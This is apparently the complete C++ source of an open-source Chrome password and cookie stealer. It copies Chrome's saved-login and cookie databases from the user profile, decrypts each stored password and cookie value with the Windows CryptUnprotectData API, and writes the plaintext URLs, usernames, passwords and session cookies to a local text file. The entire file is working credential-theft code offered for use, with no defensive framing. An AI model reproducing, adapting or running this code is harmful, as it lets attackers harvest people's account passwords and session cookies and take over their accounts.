/*
	Author: Adnan Alhomssi
	URL: https://github.com/adnanonline/chrome-passwords
	License: GNU GPL V3
	
	MAKE: cl /EHsc chrome-passwords.cpp sqlite3.c
*/
#include "stdafx.h"

using namespace std;

char *output = "chrome_secrets.txt";
stringstream debug(string(""));
int isdebug = 0;
const char* pretty_passwd_template = "{\n\t%s: %s\n\t%s: %s\n\t%s:%s\n}\n";
const char* pretty_cookie_template = "{\n\t%s: %s\n\t%s: %s\n\t%s: %s\n\t%s: %s\n}\n";

/*
** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
** column to DATA_BLOB data structure which is convient for Win32API CryptUnprotectData function
*/
stringstream getPass(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	
	const char *zSql = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		cout << "[X] statement failed rc = " << rc << endl;
		return dump;
	}
	//cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	//cout << "RC: " << rc << endl;
	
	while (rc == SQLITE_ROW) {
		char* url_col =  (char *)sqlite3_column_name(pStmt, 0);
		char* url =  (char *)sqlite3_column_text(pStmt, 0);
		
		char* username_col = (char *)sqlite3_column_name(pStmt, 1);
		char* username = (char *)sqlite3_column_text(pStmt, 1);
		
		char* password_col = (char *)sqlite3_column_name(pStmt, 2);
		
		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		char* dec_pass = (char*)calloc(1,decryptedPass.cbData);
		while (isprint(*c)) {
			strncat(dec_pass, (char*)c, 1);
			c++;
		}
		
		int extralen = 64;
		unsigned long prsz = extralen + strlen(url_col) + strlen(url) +
								strlen(username_col) + strlen(username) +
								strlen(password_col) + strlen(dec_pass);
		if(strlen(username) + strlen(dec_pass) + strlen(url) == 0){
			rc = sqlite3_step(pStmt);
			continue;
		}
		char* pretty = (char*)calloc(1, prsz);
		snprintf(pretty, prsz-1, pretty_passwd_template, url_col, url, username_col, username, password_col, dec_pass);
		
		dump << pretty << endl;
		
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);
	
	return dump;
}
stringstream getCookies(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT HOST_KEY,path, name, encrypted_value from cookies";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		if(isdebug) cout << "statement failed rc = " << rc << endl;
		return dump;
	}
	//cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	//cout << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		char* HOST_KEY_col =  (char *)sqlite3_column_name(pStmt, 0);
		char* HOST_KEY =  (char *)sqlite3_column_text(pStmt, 0);
		
		char* path_col = (char *)sqlite3_column_name(pStmt, 1);
		char* path = (char *)sqlite3_column_text(pStmt, 1);
		
		char* name_col = (char *)sqlite3_column_name(pStmt, 2);
		char* name = (char *)sqlite3_column_text(pStmt, 2);
		
		const char* cookies_col = "cookies"; //(char *)sqlite3_column_name(pStmt, 2);

		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 3);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 3), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		char* dec_cookies = (char*)calloc(1,decryptedPass.cbData);
		while (isprint(*c)) {
			strncat(dec_cookies, (char*)c, 1);
			c++;
		}
		
		int extralen = 64;
		unsigned long prsz = extralen + strlen(HOST_KEY_col) + strlen(HOST_KEY) +
								strlen(path_col) + strlen(path) +
								strlen(name_col) + strlen(name) +
								strlen(cookies_col) + strlen(dec_cookies);
								
		if(strlen(HOST_KEY) + strlen(path) + strlen(dec_cookies) == 0){
			rc = sqlite3_step(pStmt);
			continue;
		}
		char* pretty = (char*)calloc(1, prsz);
		snprintf(pretty, prsz-1, pretty_cookie_template, HOST_KEY_col, HOST_KEY, path_col, path, name_col, name, cookies_col, dec_cookies);
		
		dump << pretty << endl;
		
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
sqlite3* getDBHandler(char* dbFilePath) {
	sqlite3 *db;
	int rc = sqlite3_open(dbFilePath, &db);
	if (rc)
	{
		cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		if(isdebug) cout << dbFilePath << "[+] DB Opened." << endl << endl;
		return db;
	}
}
//relative to chrome directory
bool copyDB(char *source, char *dest) {
	//Form path for Chrome's Login Data 
	string path = getenv("LOCALAPPDATA");
	path.append("\\Google\\Chrome\\User Data\\Default\\");
	path.append(source);
	//copy the sqlite3 db from chrome directory 
	//as we are not allowed to open it directly from there (chrome could also be running)
	ifstream  src(path, std::ios::binary);
	ofstream  dst(dest, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
	return true; //ToDo: error handling
}
int unlink_file(const char *fileName) {
	if (remove(fileName) != 0)
		cout << "[-] Could not delete " << fileName << endl;
	else
		cout << "[*] Deleted... Bye bye: \"" << fileName << "\"" << endl;
	return 0;
}
int main(int argc, char **argv)
{
	int rc;
	int err = 0;
	
	// delete old output 
	unlink_file(output);
	
	// Open outstream file
	ofstream outp;
	outp.open(output, ios::out | ios::ate);
	
	// Dump Passwords
	if(isdebug) cout << "Copying db ..." << endl;
	copyDB("Login Data", "passwordsDB");
	sqlite3 *passwordsDB = getDBHandler("passwordsDB");
	stringstream passwords = getPass(passwordsDB);
	
	if(isdebug) cout << passwords.str(); // debug print 
	outp << passwords.str() ; // write file

	if (sqlite3_close(passwordsDB) == SQLITE_OK){
		;;//cout << "DB connection closed properly" << endl;
	}else{
		cout << "[-] Failed to close DB connection" << endl;
		err=1;
	}
	
	
	// Dump Cookies 
	copyDB("Cookies", "cookiesDB");
	sqlite3 *cookiesDb = getDBHandler("cookiesDB");
	stringstream cookies = getCookies(cookiesDb);
	
	if(isdebug) cout << cookies.str(); // debug print
	outp << cookies.str(); // write file
	
	if (sqlite3_close(cookiesDb) == SQLITE_OK){
		;;//cout << "DB connection closed properly" << endl;
	}else{
		cout << "[-] Failed to close DB connection" << endl;
		err=1;
	}
	
	
	outp.close();
	if(!err){
		cout << "[+] DONE... All good..." << endl;
	}

	return 0;
}